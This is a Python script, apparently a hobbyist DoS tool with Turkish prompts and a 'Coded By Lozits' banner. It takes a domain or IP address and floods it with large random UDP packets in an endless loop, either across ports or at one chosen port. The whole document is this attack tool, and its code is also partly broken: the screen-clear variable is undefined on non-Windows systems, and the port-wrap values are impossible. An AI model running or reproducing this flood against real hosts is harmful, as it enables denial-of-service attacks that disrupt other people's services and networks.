from platform import system
from tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
import sys

print('''
\033[94;1m███████╗███████╗████████╗
╚══███╔╝██╔════╝╚══██╔══╝
  ███╔╝ █████╗      ██║   
 ███╔╝  ██╔══╝      ██║   
███████╗███████╗   ██║   
╚══════╝╚══════╝   ╚═╝   
                                                                                                                                           
''')
def slowprint(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(5. / 100)
slowprint("\033[93;1m[!] Coded By Lozits ")
time.sleep(2)


uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear_clear)


sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(14900)



while True:
    
   
    print("\033[92;1m")
    print("->1 Website Domain\n->2 IP Addres\n->3 Exit")
    print('\033[0m')

    
    opt = str(input("\n---> "))

    # Selection.
    if opt == '1':
        domain = str(input("Domain:"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP Address: "))
        break

            
        

    elif opt == '3':
        exit()

    else:
        print('\033[91mGeçersiz Seçim!\033[0m')
        time.sleep(4)
        os.system(cmd_clear_clear)


port_mode = False 
port = 4

while 2:
    port_bool = str(input("Belirli port var mı [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mGeçersiz Seçim!\033[0m')
        time.sleep(2)

# Starting working.
os.system(cmd_clear_clear)
print('\033[36;2mBAŞLATILIYOR...')
time.sleep(2)
print('BAŞLANGIÇ...')
time.sleep(8)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 131068:
                port = 2

            elif port == 3800:
                port = 3802

            sock.sendto(bytes, (ip, port))
            sent += 4
            port += 4
            print("\033[32;1mGönderildi %s ip adres %s port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mçıkıldı\033[0m')

elif port_mode == True: # Certain port.
    if port < 4:
        port = 4
        
    elif port == 131068:
        port = 4

    elif port == 3800:
        port = 3802

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mGönderildi %s ip adres %s port :%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mçıkıldı\033[0m')
